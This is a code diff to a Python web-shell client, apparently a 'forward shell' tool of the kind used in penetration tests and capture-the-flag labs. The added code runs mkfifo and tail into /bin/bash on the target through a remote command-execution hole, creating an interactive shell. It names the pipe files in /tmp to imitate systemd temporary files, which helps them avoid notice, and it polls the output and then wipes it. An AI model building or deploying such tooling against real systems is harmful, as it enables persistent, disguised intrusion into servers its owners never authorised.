@@ -16,14 +16,29 @@ from urllib3.exceptions import InsecureRequestWarning
 # Suppress only the single warning from urllib3 needed.
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 class WebShell(object):
+
     # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
     def __init__(self, interval=1.3):
         # MODIFY THIS, URL
         session = random.randrange(10000,99999)
         print(f"[*] Session ID: {session}")
-        self.stdin = f'/dev/shm/input.{session}'
-        self.stdout = f'/dev/shm/output.{session}'
+        self.stdin = f'/tmp/systemd-0a48ae431dc94b45a6d2b2f7c665df11-{session}'
+        self.stdout = f'/tmp/systemd-0a48ae431dc94b45a6d2b2f7c665df01-{session}'
         self.interval = interval
+        
+        print("[*] Setting up fifo shell on target")
+        MakeNamedPipes = f"mkfifo {self.stdin}; tail -f {self.stdin} | /bin/bash 2>&1 > {self.stdout}"
+        self.RunRawCmd(MakeNamedPipes, timeout=0.1)
+        
+    def ReadThread(self):
+        GetOutput = f"cat {self.stdout}"
+        while True:
+            result = self.RunRawCmd(GetOutput) #, proxy=None)
+            if result:
+                print(result)
+                ClearOutput = f'echo -n "" > {self.stdout}'
+                self.RunRawCmd(ClearOutput)
+            time.sleep(self.interval)
         
     # Execute Command.
     def RunRawCmd(self, cmd, upload=False, timeout=50):
